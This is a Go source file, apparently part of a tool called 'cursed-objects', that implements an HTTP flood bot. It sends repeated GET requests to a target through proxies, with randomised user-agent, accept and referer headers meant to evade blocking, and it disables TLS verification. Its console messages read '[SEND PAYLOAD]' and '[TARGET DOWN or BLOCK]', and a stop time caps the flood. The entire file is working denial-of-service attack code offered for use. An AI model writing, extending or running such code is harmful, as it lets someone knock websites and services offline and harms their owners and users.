package bot

import (
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"time"

	"z3ntl3/cursed-objects/globals"

	"github.com/monaco-io/request/request"
)

type (
	BotClient struct {
		Target string
		StopAt time.Time
		Concurrency int
	}
)

func(c *BotClient) Request(proxy string) error{
	if time.Now().Unix() >= c.StopAt.Unix() {
		log.Fatal("Forced STOP due to flood duration exceeded given time")
	}
	ref := globals.Table
	req := request.New().
	AddTLSConfig(&tls.Config{InsecureSkipVerify: true}).
	AddHeader(map[string]string{
		"cache-control": "must-revalidate",
		"user-agent": ref[globals.UAS][rand.Intn(len(ref[globals.UAS]))],
		"accept": ref[globals.ACCEPTS][rand.Intn(len(ref[globals.ACCEPTS]))],
		"referer": ref[globals.REFS][rand.Intn(len(ref[globals.REFS]))],
		"connection": "keep-alive",
	})

	proxyUri, err := url.Parse(fmt.Sprintf("http://%s", proxy)); if err != nil {
		return err
	}
	req.Ctx().Client.Transport = &http.Transport{
		Proxy: http.ProxyURL(proxyUri),
	}

	req = req.GET(c.Target)
	for i := 0 ; i < c.Concurrency; i ++ {
		resp := req.Send()
		defer resp.Close()

		if resp.Error() == nil {
			// SUCCESS
			fmt.Printf("\x1b[33m[SEND PAYLOAD]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
		} else {
			// FAILURE
			fmt.Printf("\x1b[31m[TARGET DOWN or BLOCK]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
		}
	}

	return nil
}	